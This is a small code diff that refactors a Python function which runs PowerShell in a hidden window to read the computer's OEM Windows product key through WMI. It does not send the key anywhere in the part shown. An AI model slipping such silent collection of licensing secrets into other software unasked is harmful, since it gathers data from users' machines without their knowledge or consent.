@@ -1,6 +1,5 @@
-
-from subprocess import STARTUPINFO,STARTF_USESHOWWINDOW,run
-from os import sep,environ
+from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, check_output
+from os import environ
 from manager.logger import Log
 from preferences.config import config
 
@@ -10,13 +9,12 @@ def ProductKey():
     try:
         startupinfo = STARTUPINFO()
         startupinfo.dwFlags |= STARTF_USESHOWWINDOW
-        result = run(
+        result = check_output(
             ['powershell', '-Command', '(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey'],
-            capture_output=True,
             text=True,
             startupinfo=startupinfo
         )
-        output = result.stdout.strip()
+        output = result.strip()
     except Exception as e:
         Log(f"ProductKey ---> {e}")
         return
